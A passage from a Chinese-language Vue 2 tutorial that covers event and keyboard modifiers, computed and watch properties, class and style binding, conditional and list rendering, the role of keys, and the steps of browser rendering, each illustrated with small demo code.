    &lt;button @click=&quot;showInfo1&quot;&gt;点我提示信息1（不传参）&lt;/button&gt;
    &lt;!-- 主动传事件本身 --&gt;
    &lt;button @click=&quot;showInfo2($event,66)&quot;&gt;点我提示信息2（传参）&lt;/button&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;vue&#39;,
        &#125;,
        methods:&#123;
            // 如果vue模板没有写event，会自动传 event 给函数
            showInfo1(event)&#123;
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert(&#39;同学你好！&#39;)
            &#125;,
            showInfo2(event,number)&#123;
                console.log(event,number)
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert(&#39;同学你好！！&#39;)
            &#125;
        &#125;
    &#125;);
&lt;/script&gt;
</code></pre>
<p><strong>Vue中的事件修饰符</strong></p>
<ul>
<li>prevent：阻止默认事件（常用）</li>
<li>stop：阻止事件冒泡（常用）</li>
<li>once：事件只触发一次（常用）</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;欢迎来到&#123;&#123;name&#125;&#125;学习&lt;/h2&gt;
    &lt;!-- 阻止默认事件（常用） --&gt;
    &lt;a href=&quot;http://www.baidu.com&quot; @click.prevent=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt;
    &lt;!-- 阻止事件冒泡（常用） --&gt;
    &lt;div class=&quot;demo1&quot; @click=&quot;showInfo&quot;&gt;
        &lt;button @click.stop=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
        &lt;!-- 修饰符可以连续写 --&gt;
        &lt;!-- &lt;a href=&quot;http://www.atguigu.com&quot; @click.prevent.stop=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt; --&gt;
    &lt;/div&gt;
    &lt;!-- 事件只触发一次（常用） --&gt;
    &lt;button @click.once=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;
&lt;/div&gt;
</code></pre>
<h2 id="1-8-键盘事件"><a href="#1-8-键盘事件" class="headerlink" title="1.8 键盘事件"></a>1.8 键盘事件</h2><p>键盘事件语法糖：@keydown，@keyup</p>
<ul>
<li><p>Vue中常用的按键别名：</p>
<ul>
<li><p>回车 =&gt; enter</p>
</li>
<li><p>删除 =&gt; delete</p>
</li>
<li><p>退出 =&gt; esc</p>
</li>
<li><p>空格 =&gt; space</p>
</li>
<li><p>换行 =&gt; tab (特殊，必须配合keydown去使用)</p>
</li>
<li><p>上 =&gt; up</p>
</li>
<li><p>下 =&gt; down</p>
</li>
<li><p>左 =&gt; left</p>
</li>
<li><p>右 =&gt; right</p>
</li>
</ul>
</li>
<li><p>系統修飾鍵 (用法特殊) ： ctrl、alt、shift、meta</p>
<ul>
<li>配合keyup使用：按下修飾鍵的同時，在按下其他鍵，隨後釋放其他鍵，事件才會被觸發。</li>
<li>配合keydown使用：正常觸發事件。</li>
</ul>
</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;欢迎来到&#123;&#123;name&#125;&#125;学习&lt;/h2&gt;
    &lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keydown.enter=&quot;showInfo&quot;&gt;
&lt;/div&gt;

&lt;script&gt;
    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;浙江理工大学&#39;
        &#125;,
        methods: &#123;
            showInfo(e)&#123;
                // console.log(e.key,e.keyCode)
                console.log(e.target.value)
            &#125;
        &#125;,
    &#125;)
&lt;/script&gt;
</code></pre>
<h2 id="1-9-计算属性"><a href="#1-9-计算属性" class="headerlink" title="1.9 计算属性"></a>1.9 计算属性</h2><ul>
<li>定义：要用的属性不存在，要通过已有属性计算得来</li>
<li>原理：底层借助了Objcet.defineProperty方法提供的getter和setter</li>
<li>get函数什么时候执行？<ul>
<li>(1).初次读取时会执行一次</li>
<li>(2).当依赖的数据发生改变时会被再次调用</li>
</ul>
</li>
<li>优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便</li>
<li>备注：<ul>
<li>计算属性最终会出现在vm上，直接读取使用即可</li>
<li>如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变</li>
</ul>
</li>
</ul>
<img src="image-20230406143257752.png" alt="image-20230406143257752" style="zoom:67%;border: 5px solid orange;" />

<blockquote>
<p>计算属性完整版写法</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;
    名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; 
    全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            firstName:&#39;张&#39;,
            lastName:&#39;三&#39;,
        &#125;
        computed:&#123;
            fullName:&#123;
                //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
                get()&#123;
                    console.log(&#39;get被调用了&#39;)
                    return this.firstName + &#39;-&#39; + this.lastName
                &#125;,
                //set什么时候调用? 当fullName被修改时。
                // 可以主动在控制台修改fullName来查看情况
                set(value)&#123;
                    console.log(&#39;set&#39;,value)
                    const arr = value.split(&#39;-&#39;)
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                &#125;
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<blockquote>
<p>计算属性简写 –&gt; (當fullName的對象中只有寫getter函數時，可以使用簡寫)</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;
    名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; 
    全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            firstName:&#39;张&#39;,
            lastName:&#39;三&#39;,
        &#125;
        computed:&#123;
        //當fullName的對象中只有寫getter函數時，可以使用簡寫
            fullName() &#123;
                console.log(&#39;get被调用了&#39;)
                return this.firstName + &#39;-&#39; + this.lastName
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h2 id="1-10-监视属性"><a href="#1-10-监视属性" class="headerlink" title="1.10 监视属性"></a>1.10 监视属性</h2><h3 id="1-10-1-监视属性watch："><a href="#1-10-1-监视属性watch：" class="headerlink" title="1.10.1 监视属性watch："></a>1.10.1 监视属性watch：</h3><ul>
<li>当被监视的属性变化时, 回调函数自动调用, 进行相关操作</li>
<li>监视的属性必须存在，才能进行监视</li>
<li>监视的两种写法：<ul>
<li>(1).new Vue时传入watch配置</li>
<li>(2).通过vm.$watch监视</li>
</ul>
</li>
</ul>
<blockquote>
<p>第一种写法</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;今天天气很&#123;&#123; info &#125;&#125;&lt;/h2&gt;
    &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;
&lt;/div&gt;


&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            isHot:true,
        &#125;,
        computed:&#123;
            info()&#123;
                return this.isHot ? &#39;炎热&#39; : &#39;凉爽&#39;
            &#125;
        &#125;,
        methods: &#123;
            changeWeather()&#123;
                this.isHot = !this.isHot
            &#125;
        &#125;,
        watch:&#123;
            isHot:&#123;
                immediate: true, // 初始化时让handler调用一下
                // handler什么时候调用？当isHot发生改变时。
                handler(newValue, oldValue)&#123;
                    console.log(&#39;isHot被修改了&#39;,newValue,oldValue)
                &#125;
            &#125;
        &#125; 
    &#125;)
&lt;/script&gt;
</code></pre>
<blockquote>
<p>第二种写法</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;今天天气很&#123;&#123; info &#125;&#125;&lt;/h2&gt;
    &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;
&lt;/div&gt;


&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            isHot:true,
        &#125;,
        computed:&#123;
            info()&#123;
                return this.isHot ? &#39;炎热&#39; : &#39;凉爽&#39;
            &#125;
        &#125;,
        methods: &#123;
            changeWeather()&#123;
                this.isHot = !this.isHot
            &#125;
        &#125;
    &#125;)

    vm.$watch(&#39;isHot&#39;,&#123;
        immediate:true, //初始化时让handler调用一下
        //handler什么时候调用？当isHot发生改变时。
        handler(newValue,oldValue)&#123;
            console.log(&#39;isHot被修改了&#39;,newValue,oldValue)
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-10-2-深度监视："><a href="#1-10-2-深度监视：" class="headerlink" title="1.10.2 深度监视："></a>1.10.2 <strong>深度监视：</strong></h3><ul>
<li>(1).Vue中的watch默认不监测对象内部值的改变（一层）</li>
<li>(2).配置deep:true可以监测对象内部值改变（多层）</li>
</ul>
<blockquote>
<p>备注：</p>
<p>(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以 (可配置deep:true手動開啟深度監視)</p>
<p>(2).使用watch时根据数据的具体结构，决定是否采用深度监视</p>
</blockquote>
<img src="image-20230406150617885.png" alt="image-20230406150617885" style="border: 5px solid orange;" />



<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &#123;&#123;numbers.c.d.e&#125;&#125;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            numbers:&#123;
                c:&#123;
                    d:&#123;
                        e:100
                    &#125;
                &#125;
            &#125;
        &#125;,
        watch:&#123;
            //监视多级结构中某个属性的变化
            /* &#39;numbers.a&#39;:&#123;
                    handler()&#123;
                        console.log(&#39;a被改变了&#39;)
                    &#125;
                &#125; */
            //监视多级结构中所有属性的变化
            numbers:&#123;
                deep:true,
                handler()&#123;
                    console.log(&#39;numbers改变了&#39;)
                &#125;
            &#125;
        &#125;
    &#125;);
&lt;/script&gt;
</code></pre>
<blockquote>
<p>监视属性简写 –&gt; (當監視的配置項只有handler時才可使用簡寫)</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;今天天气很&#123;&#123;info&#125;&#125;&lt;/h2&gt;
    &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            isHot:true,
        &#125;,
        computed:&#123;
            info()&#123;
                return this.isHot ? &#39;炎热&#39; : &#39;凉爽&#39;
            &#125;
        &#125;,
        methods: &#123;
            changeWeather()&#123;
                this.isHot = !this.isHot
            &#125;
        &#125;,
        watch:&#123;
            //當監視的配置項只有handler時才可使用簡寫
            isHot(newValue, oldValue) &#123;
                    console.log(&#39;isHot被修改了&#39;, newValue, oldValue, this)
            &#125; 
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<blockquote>
<p>vm.$watch簡寫</p>
</blockquote>
<pre><code class="html">&lt;script&gt;
    //完整寫法
    vm.$watch(&#39;isHot&#39;,&#123;
        immediate:true, //初始化时让handler调用一下
        //handler什么时候调用？当isHot发生改变时。
        handler(newValue,oldValue)&#123;
            console.log(&#39;isHot被修改了&#39;,newValue,oldValue)
        &#125;
    &#125;)
    
    //簡寫
    vm.$watch(&#39;isHot&#39;,function(newValue,oldValue)&#123;
        console.log(&#39;isHot被修改了&#39;,newValue,oldValue)
    &#125;)
       
&lt;/script&gt;
</code></pre>
<h3 id="1-10-3-computed和watch之间的区别："><a href="#1-10-3-computed和watch之间的区别：" class="headerlink" title="1.10.3 computed和watch之间的区别："></a>1.10.3 <strong>computed和watch之间的区别：</strong></h3><ul>
<li>computed能完成的功能，watch都可以完成</li>
<li>watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作</li>
</ul>
<blockquote>
<p>:bulb:两个重要的小原则：</p>
<p>1.所被***<font color=red>Vue管理的函数</font><em><strong>，最好</strong></em><font color=red>写成普通函数</font>***，这样this的指向才是vm 或 组件实例对象</p>
<p>2.所有***<font color=red>不被Vue所管理的函数</font><em><strong>（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好</strong></em><font color=red>写成箭头函数</font>***，这样this的指向才是vm 或 组件实例对象</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br/&gt;&lt;br/&gt;
    名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br/&gt;&lt;br/&gt;
    全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            firstName:&#39;张&#39;,
            lastName:&#39;三&#39;,
            fullName:&#39;张-三&#39;
        &#125;,
        watch:&#123;
            // watch 监视器里可以写 异步函数
            firstName(val)&#123;
                setTimeout(()=&gt;&#123;
                    console.log(this)
                    this.fullName = val + &#39;-&#39; + this.lastName
                &#125;,1000);
            &#125;,
            lastName(val)&#123;
                this.fullName = this.firstName + &#39;-&#39; + val
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h2 id="1-11-绑定样式"><a href="#1-11-绑定样式" class="headerlink" title="1.11 绑定样式"></a>1.11 绑定样式</h2><h3 id="1-11-1-class样式"><a href="#1-11-1-class样式" class="headerlink" title="1.11.1 class样式"></a>1.11.1 <strong>class样式</strong></h3><p>写法：:class=”xxx”    xxx可以是字符串、对象、数。</p>
<p>所以分为三种写法，字符串写法，数组写法，对象写法</p>
<h5 id="1-字符串写法"><a href="#1-字符串写法" class="headerlink" title="1. 字符串写法"></a>1. <strong>字符串写法</strong></h5><p>字符串写法适用于：类名不确定，要动态获取。</p>
<pre><code class="html">&lt;style&gt;
    .normal&#123;
        background-color: skyblue;
    &#125;
&lt;/style&gt;

&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;
    &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            mood:&#39;normal&#39;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h5 id="2-数组写法"><a href="#2-数组写法" class="headerlink" title="2. 数组写法"></a>2. <strong>数组写法</strong></h5><p>数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。</p>
<pre><code class="html">&lt;style&gt;
    .atguigu1&#123;
        background-color: yellowgreen;
    &#125;
    .atguigu2&#123;
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    &#125;
    .atguigu3&#123;
        border-radius: 20px;
    &#125;
&lt;/style&gt;

&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;
    &lt;div class=&quot;basic&quot; :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            classArr: [&#39;atguigu1&#39;,&#39;atguigu2&#39;,&#39;atguigu3&#39;]
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h5 id="3-对象写法"><a href="#3-对象写法" class="headerlink" title="3. 对象写法"></a>3. <strong>对象写法</strong></h5><p>对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。</p>
<pre><code class="html">&lt;style&gt;
    .atguigu1&#123;
        background-color: yellowgreen;
    &#125;
    .atguigu2&#123;
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    &#125;
&lt;/style&gt;

&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;
    &lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            classObj:&#123;
                atguigu1:false,
                atguigu2:false,
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-11-2-style样式"><a href="#1-11-2-style样式" class="headerlink" title="1.11.2 style样式"></a>1.11.2 <strong>style样式</strong></h3><p>有两种写法，对象写法，数组写法</p>
<h5 id="1-对象写法"><a href="#1-对象写法" class="headerlink" title="1. 对象写法"></a>1. <strong>对象写法</strong></h5><pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 绑定style样式--对象写法 --&gt;
    &lt;div class=&quot;basic&quot; :style=&quot;styleObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            styleObj:&#123;
                fontSize: &#39;40px&#39;,
                color:&#39;red&#39;,
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h5 id="2-数组写法-1"><a href="#2-数组写法-1" class="headerlink" title="2. 数组写法"></a>2. <strong>数组写法</strong></h5><pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 绑定style样式--数组写法 --&gt;
    &lt;div class=&quot;basic&quot; :style=&quot;styleArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            styleArr:[
                &#123;
                    fontSize: &#39;40px&#39;,
                    color:&#39;blue&#39;,
                &#125;,
                &#123;
                    backgroundColor:&#39;gray&#39;
                &#125;
            ]
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<blockquote>
<p>:bulb:綁定樣式小結</p>
<ol>
<li>class樣式<ul>
<li>寫法：class=”xxx”，xxx可以是字符串、對象、數組<ul>
<li>字符串寫法適用於：類名不確定，要動態獲取</li>
<li>對象寫法適用於：要綁定多個樣式，個數不確定，名子也不確定</li>
<li>數組寫法適用於：要綁定多個樣式，個數確定，名子也確定，但不確定用不用</li>
</ul>
</li>
</ul>
</li>
<li>style樣式<ul>
<li>:style = “{fontSize：xxx}” ，其中xxx是動態值</li>
<li>:style = “[a,b]”，其中a、b是樣式對象</li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="1-12-条件渲染"><a href="#1-12-条件渲染" class="headerlink" title="1.12 条件渲染"></a>1.12 条件渲染</h2><h3 id="1-12-1-v-if"><a href="#1-12-1-v-if" class="headerlink" title="1.12.1 v-if"></a>1.12.1 v-if</h3><ul>
<li><p>写法：</p>
<p>(1).v-if=”表达式”</p>
<p>(2).v-else-if=”表达式”</p>
<p>(3).v-else=”表达式”</p>
</li>
<li><p>适用于：切换频率较低的场景</p>
</li>
<li><p>特点：不展示的DOM元素直接被移除</p>
</li>
<li><p>注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断” (亦即要連在一起)</p>
</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 使用v-if做条件渲染 --&gt;
    &lt;h2 v-if=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;
    &lt;h2 v-if=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;


    &lt;!-- v-else和v-else-if --&gt;
    &lt;div v-if=&quot;n === 1&quot;&gt;Angular&lt;/div&gt;
    &lt;div v-else-if=&quot;n === 2&quot;&gt;React&lt;/div&gt;
    &lt;div v-else-if=&quot;n === 3&quot;&gt;Vue&lt;/div&gt;
    &lt;div v-else&gt;哈哈&lt;/div&gt;


    &lt;!-- v-if与template的配合使用 --&gt;
    &lt;!-- 就不需要写好多个判断，写一个就行 --&gt;
    &lt;!-- 这里的思想就像事件代理的使用 --&gt;
    &lt;template v-if=&quot;n === 1&quot;&gt;
        &lt;h2&gt;你好&lt;/h2&gt;
        &lt;h2&gt;尚硅谷&lt;/h2&gt;
        &lt;h2&gt;北京&lt;/h2&gt;
    &lt;/template&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            styleArr:[
                &#123;
                    fontSize: &#39;40px&#39;,
                    color:&#39;blue&#39;,
                &#125;,
                &#123;
                    backgroundColor:&#39;gray&#39;
                &#125;
            ]
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-12-2-v-show"><a href="#1-12-2-v-show" class="headerlink" title="1.12.2 v-show"></a>1.12.2 <strong>v-show</strong></h3><ul>
<li>写法：v-show=”表达式”</li>
<li>适用于：切换频率较高的场景</li>
<li>特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(display:none)</li>
</ul>
<blockquote>
<p>备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到</p>
<p>v-if 是实打实地改变dom元素，v-show 是隐藏或显示dom元素</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 使用v-show做条件渲染 --&gt;
    &lt;h2 v-show=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;
    &lt;h2 v-show=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;
&lt;/div&gt;
</code></pre>
<h2 id="1-13-列表渲染"><a href="#1-13-列表渲染" class="headerlink" title="1.13 列表渲染"></a>1.13 列表渲染</h2><h3 id="1-13-1-基本列表-v-for指令"><a href="#1-13-1-基本列表-v-for指令" class="headerlink" title="1.13.1 基本列表 (v-for指令)"></a>1.13.1 基本列表 (v-for指令)</h3><ul>
<li>用于展示列表数据</li>
<li>语法：v-for=”(item, index) in xxx” :key=”yyy”</li>
</ul>
<blockquote>
<p>key值必須唯一</p>
</blockquote>
<ul>
<li>可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）</li>
</ul>
<pre><code class="html">&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 遍历数组 --&gt;
    &lt;h2&gt;人员列表（遍历数组）&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;index&quot;&gt;
            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;
        &lt;/li&gt;
    &lt;/ul&gt;

    &lt;!-- 遍历对象 --&gt;
    &lt;h2&gt;汽车信息（遍历对象）&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(value,k) of car&quot; :key=&quot;k&quot;&gt;
            &#123;&#123;k&#125;&#125;-&#123;&#123;value&#125;&#125;
        &lt;/li&gt;
    &lt;/ul&gt;

    &lt;!-- 遍历字符串 --&gt;
    &lt;h2&gt;测试遍历字符串（用得少）&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(char,index) of str&quot; :key=&quot;index&quot;&gt;
            &#123;&#123;char&#125;&#125;-&#123;&#123;index&#125;&#125;
        &lt;/li&gt;
    &lt;/ul&gt;

    &lt;!-- 遍历指定次数 --&gt;
    &lt;h2&gt;测试遍历指定次数（用得少）&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(number,index) of 5&quot; :key=&quot;index&quot;&gt;
            &#123;&#123;index&#125;&#125;-&#123;&#123;number&#125;&#125;
        &lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data: &#123;
            persons: [
                &#123; id: &#39;001&#39;, name: &#39;张三&#39;, age: 18 &#125;,
                &#123; id: &#39;002&#39;, name: &#39;李四&#39;, age: 19 &#125;,
                &#123; id: &#39;003&#39;, name: &#39;王五&#39;, age: 20 &#125;
            ],
            car: &#123;
                name: &#39;奥迪A8&#39;,
                price: &#39;70万&#39;,
                color: &#39;黑色&#39;
            &#125;,
            str: &#39;hello&#39;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h3 id="1-13-2-key的原理"><a href="#1-13-2-key的原理" class="headerlink" title="1.13.2 key的原理"></a>1.13.2 <strong>key的原理</strong></h3><p>vue中的key有什么作用？（key的内部原理）</p>
<p>了解vue中key的原理需要一些前置知识。</p>
<p>就是vue的虚拟dom，vue会根据 data中的数据生成虚拟dom，如果是第一次生成页面，就将虚拟dom转成真实dom，在页面展示出来。</p>
<p>虚拟dom有啥用？每次vm._data 中的数据更改，都会触发生成新的虚拟dom，新的虚拟dom会跟旧的虚拟dom进行比较，如果有相同的，在生成真实dom时，这部分相同的就不需要重新生成，只需要将两者之间不同的dom转换成真实dom，再与原来的真实dom进行拼接。我的理解是虚拟dom就是起到了一个dom复用的作用，还有避免重复多余的操作，下文有详细解释。</p>
<p>而key有啥用？</p>
<p>key是虚拟dom的标识。</p>
<p>先来点预备的知识：啥是真实 DOM？真实 DOM 和 虚拟 DOM 有啥区别？如何用代码展现真实 DOM 和 虚拟 DOM</p>
<h5 id="1-真实DOM和其解析流程"><a href="#1-真实DOM和其解析流程" class="headerlink" title="1. 真实DOM和其解析流程"></a>1. 真实<code>DOM</code>和其解析流程</h5><p>这里参考超级英雄大佬：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903895467032589">https://juejin.cn/post/6844903895467032589</a></p>
<p><code>webkit</code> 渲染引擎工作流程图</p>
<img src="image-20230406174522418.png" alt="image-20230406174522418" style="border: 5px solid orange;" />

<blockquote>
<p>中文版</p>
</blockquote>
<img src="image-20230406174528046.png" alt="image-20230406174528046" style="border: 5px solid orange;" />

<p>所有的浏览器渲染引擎工作流程大致分为5步：创建 <code>DOM</code> 树 —&gt; 创建 <code>Style Rules</code> -&gt; 构建 <code>Render</code> 树 —&gt; 布局 <code>Layout</code> -—&gt; 绘制 <code>Painting</code>。</p>
<ul>
<li><p>第一步，构建 DOM 树：当浏览器接收到来自服务器响应的HTML文档后，会遍历文档节点，生成DOM树。需要注意的是在DOM树生成的过程中有可能会被CSS和JS的加载执行阻塞，渲染阻塞下面会讲到。</p>
</li>
<li><p>第二步，生成样式表：用 CSS 分析器，分析 CSS 文件和元素上的 inline 样式，生成页面的样式表；</p>
</li>
<li><p>渲染阻塞：当浏览器遇到一个script标签时，DOM构建将暂停，直到脚本加载执行，然后继续构建DOM树。每次去执行Javascript脚本都会严重阻塞DOM树构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM没有下载和构建，那么浏览器甚至会延迟脚本执行和构建DOM，直到这个CSSOM的下载和构建。所以，script标签引入很重要，实际使用时可以遵循下面两个原则：</p>
<ul>
<li><p>css优先：引入顺序上，css资源先于js资源</p>
</li>
<li><p>js后置：js代码放在底部，且js应尽量少影响DOM构建</p>
<blockquote>
<p>还有一个小知识：当解析html时，会把新来的元素插入dom树里，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序匹配的例如：div p {…}，会先寻找所有p标签并判断它的父标签是否为div之后才决定要不要采用这个样式渲染。所以平时写css尽量用class或者id，不要过度层叠</p>
</blockquote>
</li>
</ul>
</li>
<li><p>第三步，构建渲染树：通过DOM树和CSS规则我们可以构建渲染树。浏览器会从DOM树根节点开始遍历每个可见节点(注意是可见节点)对每个可见节点，找到其适配的CSS规则并应用。渲染树构建完后，每个节点都是可见节点并且都含有其内容和对应的规则的样式。这也是渲染树和DOM树最大的区别所在。渲染是用于显示，那些不可见的元素就不会在这棵树出现了。除此以外，display none的元素也不会被显示在这棵树里。visibility hidden的元素会出现在这棵树里。</p>
</li>
<li><p>第四步，<strong>渲染布局</strong>：布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。</p>
</li>
<li><p>第五步，<strong>渲染树绘制</strong>：在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。</p>
</li>
</ul>
<p><strong>注意点：</strong></p>
<p><strong>1、<code>DOM</code> 树的构建是文档加载完成开始的？</strong> 构建 <code>DOM</code> 树是一个渐进过程，为达到更好的用户体验，渲染引擎会尽快将内容显示在屏幕上，它不必等到整个 <code>HTML</code> 文档解析完成之后才开始构建 <code>render</code> 树和布局。</p>
